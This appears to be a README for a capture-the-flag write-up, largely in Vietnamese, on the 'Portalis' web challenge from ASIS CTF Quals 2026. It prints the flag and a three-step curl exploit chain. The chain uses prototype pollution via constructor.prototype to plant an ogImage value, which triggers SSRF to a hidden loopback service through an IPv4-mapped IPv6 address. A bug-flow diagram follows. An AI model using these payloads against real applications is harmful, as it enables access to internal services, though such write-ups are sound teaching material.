# Portalis — ASIS CTF Quals 2026 (Web)

**Flag:** `ASIS{Y0U_WeR3nT_SuPp0$eD_To_S3E_Th1S_P0rT@L}`

Challenge: link-in-bio app theme Rick & Morty. Portalis tạo "preview card" mỗi khi
profile được share. Flag nằm ở service nội bộ ẩn — chỉ tiếp cận được bằng
prototype pollution → SSRF → port-scan loopback.

## Chuỗi khai thác cuối cùng (3 request)

```bash
# 1. Tạo session (server tự set cookie sid)
curl -c ck.txt -X PUT http://91.107.189.166:3000/api/theme \
  -H 'Content-Type: application/json' -d '{"name":"x"}'

# 2. Prototype pollution → gán ogImage (field bị cấm set) → trỏ vào service ẩn
#    trên IPv4 loopback port 9001
curl -b ck.txt -X PUT http://91.107.189.166:3000/api/theme \
  -H 'Content-Type: application/json' \
  -d '{"constructor":{"prototype":{"ogImage":"http://[::ffff:127.0.0.1]:9001/flag"}}}'

# 3. Đọc body response của fetch nội bộ qua preview diagnostics
curl -b ck.txt http://91.107.189.166:3000/api/preview
# → "ASIS{Y0U_WeR3nT_SuPp0$eD_To_S3E_Th1S_P0rT@L}"
```

## Tài liệu trong folder này

| File | Nội dung |
|---|---|
| `01-recon.md` | Recon ban đầu: cấu trúc site, API, phát hiện schema bất đối xứng |
| `02-prototype-pollution.md` | Prototype pollution qua deep-merge: các vector ăn/chết, sai lầm `__proto__` vs `constructor.prototype` |
| `03-ssrf.md` | SSRF qua `ogImage`: filter map, error oracle, đọc body, network mapping |
| `04-dead-ends.md` | Toàn bộ hướng đã thử và chết (có bằng chứng) — trị giá để không đi lại |
| `05-the-miss.md` | Vì sao bỏ sót port 9001 qua 3 phiên — phân tích lỗ hổng phương pháp |
| `06-final-exploit.md` | Quá trình tìm ra service ẩn + exploit cuối + bài học |
| `07-mistakes.md` | Retrospective: 9 sai lầm cụ thể (flag giả, bí tắc), giải phẫu từng cơn kẹt |

## Bản đồ bug

```
PUT /api/theme  ──deep-merge không bảo vệ──▶  Object.prototype polluted
                                                    │
GET /api/preview ──media pipeline fetch───▶  ogImage (kế thừa từ prototype)
                                                    │
                                    fetch http://[::ffff:127.0.0.1]:9001/flag
                                                    │
                                    "HTTP 200 ... preview: <body>"  ← FLAG
```

Service ẩn `media-metadata service` chỉ listen **IPv4 loopback** — vô hình với
port scan từ ngoài và với scan IPv6 `[::1]`.
